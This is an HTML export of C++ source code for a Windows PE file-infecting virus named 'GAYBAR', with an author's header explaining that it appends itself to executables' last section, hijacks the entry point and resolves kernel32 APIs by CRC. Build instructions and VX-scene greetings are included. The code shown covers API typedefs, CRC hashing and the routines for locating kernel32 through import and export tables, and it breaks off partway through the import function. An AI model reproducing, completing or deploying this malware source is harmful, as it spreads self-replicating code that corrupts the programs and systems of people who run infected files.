<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">/*

          Welcome to the GAYBAR§§§ (from ikx industries)
        -================================================-

 Technically, this virus has nothing new. It's a very old school virus that appends 
 its code to the last section and modifies the entry point in the PE header. It 
 browses the import table in order to find the kernel address and imports APIs by CRC. 
 The virus is about 1200 bytes long. It's a bit big for a virus of this kind and it 
 requires some optimization. The main idea is that it was written in 100% c++ to take 
 advantage of the use of classes. No assembly file or special linking is needed. It 
 does everything just as a standard assembly virus would do.  It has no need for 
 relocation; it can use global pointers and ignores the delta pointer problem. It was 
 compiled using Visual Studio Architect. Just remove the "Buffer Security Check" and 
 put it in release mode. (Don’t forget to put size optimization). It also seems to work 
 with Visual Studio 6.0.

 But, all is not pink in this happy world. There are a few problems. You can't use any 
 strings inside the executable. I reconstructed the strings by dropping values into 
 buffers as a meta virus would do. (int k[0] = 'xe.*') We are seeking how to solve 
 this problem in a better way. Also, it's not really 100% c++ as it still has a stub 
 loader that will call the virus body. This part is in assembly and consists of a few 
 pushes and a call. This virus might be "portable" to other platforms as long as you 
 remedy the stub problem. 

 The point of this virus is to pimp people to the c++ side.  A virus can be done within 
 a reasonable size using c++, doing almost as well as an assembly virus. I hope this 
 creates a new era with future babies coming along.

 Greets to: 

 Vorgon:   You are god, i bow down before you oh master dark lord of VX. My Hero!
 Lifewire: to have pimped me to the c++ side, for the original idea as well as the
         the motivation
 UnderX:   to be the 1st to listen to my bragging description
 Griyo:    who was the second
 Cecile:   Damn, I like you, wanted to dedicate this virus to you but I preferred the
         GAYBAR!  jtm
 Morphine: for correcting my english! 10x0r!

 Welcome to the GAYBAR !!

*/</span><span class="sc0">

</span><span class="sc9">#include "stdio.h"
#include "windows.h"
#include "PE.hpp"
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iGetModuleHandle</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iLoadLibraryA</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iFindFirstFileA</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*,</span><span class="sc11">LPWIN32_FIND_DATA</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iFindNextFileA</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc11">LPWIN32_FIND_DATA</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iOutputDebugStringA</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCreateFileA</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">HANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCreateFileMappingA</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iMapViewOfFile</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iUnmapViewOfFile</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCloseHandle</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iGetFileSize</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#define LoadLibraryACrc 0x660E91B6
#define FindFirstFileACrc 0xFACA6F2D
#define FindNextFileACrc 0x47F9DA21
#define OutputDebugStringACrc 0xFBDF28B7
#define CreateFileACrc 0x8DC85CF9
#define CreateFileMappingACrc 0xA3A46E23
#define MapViewOfFileCrc 0x505C8F3F
#define UnmapViewOfFileCrc 0x5239B6AF
#define CloseHandleCrc 0x4E1ED759
#define GetFileSizeCrc 0xC37E2502
</span><span class="sc0">
</span><span class="sc9">#define vir_size (((int) main - 0x00401000))
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">start</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ImageBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">viruslocation</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">iround</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">)*</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// Dumb crc routine, it isn't really crc, less powerful but it's sufficient for 
// apiname checking.
</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">GetAPICrc</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">k</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">3</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">class</span><span class="sc0"> </span><span class="sc11">virus</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">public</span><span class="sc10">:</span><span class="sc0">
        
        </span><span class="sc2">//
</span><span class="sc0">        </span><span class="sc2">//  Api finder, you specify the Address base of the PE and the crc
</span><span class="sc0">        </span><span class="sc2">//  of the address and it will return the address to you.  If it fails, it
</span><span class="sc0">        </span><span class="sc2">//  returns 0 and sets a global flag called missed
</span><span class="sc0">        </span><span class="sc2">//
</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ModuleBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">APICrc</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">PE_STRUCT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PEheaderBase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_STRUCT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ModuleBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ModuleBase</span><span class="sc10">+</span><span class="sc4">0x3C</span><span class="sc10">))[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc11">PE_EXPORT_STRUCT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ExportTable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_EXPORT_STRUCT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">ModuleBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_exportrva</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_exportrva</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// Here you get all the pointers, so once it's found, you only have to
</span><span class="sc0">                </span><span class="sc2">// grab the data from the table once
</span><span class="sc0">
                </span><span class="sc11">DWORD</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">NameTable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ModuleBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ExportTable</span><span class="sc10">-&gt;</span><span class="sc11">ex_namepointersrva</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">WORD</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Ordinaltable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ModuleBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ExportTable</span><span class="sc10">-&gt;</span><span class="sc11">ex_ordinaltablerva</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">DWORD</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">AddressTable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ModuleBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ExportTable</span><span class="sc10">-&gt;</span><span class="sc11">ex_addresstablerva</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ExportTable</span><span class="sc10">-&gt;</span><span class="sc11">ex_numofnamepointers</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetAPICrc</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">ModuleBase</span><span class="sc10">+</span><span class="sc11">NameTable</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">APICrc</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ModuleBase</span><span class="sc10">+</span><span class="sc11">AddressTable</span><span class="sc10">[</span><span class="sc11">Ordinaltable</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]];</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">missed</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// Linked chain
</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">NameList</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">NameList</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Previous</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">location</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">};</span><span class="sc0">

        </span><span class="sc2">//
</span><span class="sc0">        </span><span class="sc2">// Find the Kernel32 address by browsing the Import Table.  It searches for
</span><span class="sc0">        </span><span class="sc2">// "KERNEL32".  If the library isn't KERNEL32, it browses the import
</span><span class="sc0">        </span><span class="sc2">// table of the library.  This is done by using a recursive function.  It
</span><span class="sc0">        </span><span class="sc2">// scans the import table and imports the table of imported libraries, and
</span><span class="sc0">        </span><span class="sc2">// etc.  But, It could cycle :(  What if user32.dll points to advapi.dll
</span><span class="sc0">        </span><span class="sc2">// and advapi.dll points to user32.dll?  It would cycle infinitly.
</span><span class="sc0">        </span><span class="sc2">//
</span><span class="sc0">        </span><span class="sc2">// I stored a list of already scanned libraries (NameList).  Before scanning
</span><span class="sc0">        </span><span class="sc2">// sub libraries, it checks if the libary hasn't been scanned yet.
</span><span class="sc0">        </span><span class="sc2">//
</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">GetK32Address</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PEImageBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">NameList</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">List</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">PE_STRUCT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PEheaderBase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_STRUCT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEImageBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEImageBase</span><span class="sc10">+</span><span class="sc4">0x3C</span><span class="sc10">))[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc11">PE_IMPORT_STRUCT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ImportTable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_IMPORT_STRUCT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEImageBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_importrva</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_importrva</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">LibName</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">// we will scan every name
</span><span class="sc0">
                    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">PEImageBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ImportTable</span><span class="sc10">-&gt;</span><span class="sc11">im_name</span><span class="sc10">)</span><span class="sc0">   
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">LibName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEImageBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ImportTable</span><span class="sc10">-&gt;</span><span class="sc11">im_name</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc2">// gets the base address of the library
</span><span class="sc0">                        </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">apitable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">**)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">PEImageBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ImportTable</span><span class="sc10">-&gt;</span><span class="sc11">im_addresstable</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">location</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">apitable</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">apitable</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
                        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">location</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'ZM'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">location</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">location</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x1000</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc2">// it isn't the kernel ?
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc0"> </span><span class="sc10">((((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">LibName</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'NREK'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">LibName</span><span class="sc10">)[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'23LE'</span><span class="sc10">)))</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">dosearch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc11">NameList</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">item</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">List</span><span class="sc10">;</span><span class="sc0">

                            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">item</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">dosearch</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">// have we searched
</span><span class="sc0">                            </span><span class="sc10">{</span><span class="sc0">                           </span><span class="sc2">// this library ?
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">location</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">item</span><span class="sc10">-&gt;</span><span class="sc11">location</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">dosearch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">item</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">item</span><span class="sc10">-&gt;</span><span class="sc11">Previous</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">

                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">dosearch</span><span class="sc10">)</span><span class="sc0">        </span><span class="sc2">// if not, it adds the name to the list
</span><span class="sc0">                            </span><span class="sc10">{</span><span class="sc0">                   </span><span class="sc2">// and scans this library
</span><span class="sc0">                                </span><span class="sc11">NameList</span><span class="sc0"> </span><span class="sc11">newitem</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">List</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">location</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
                                </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">retaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetK32Address</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">location</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">newitem</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retaddr</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retaddr</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">location</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc11">ImportTable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_IMPORT_STRUCT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">ImportTable</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PE_IMPORT_STRUCT</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0"> 
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//
</span><span class="sc0">        </span><span class="sc2">// Searches all the needed api, starting by retrieving kernel32 address 
</span><span class="sc0">        </span><span class="sc2">// from current process import table, if it's found, import all apis. If an
</span><span class="sc0">        </span><span class="sc2">// api is missed, bool missed has been set to true and it will return false
</span><span class="sc0">        </span><span class="sc2">//
</span><span class="sc0">
        </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">Import</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PEImageBase</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">K32Address</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetK32Address</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">PEImageBase</span><span class="sc10">);</span><span class="sc0">
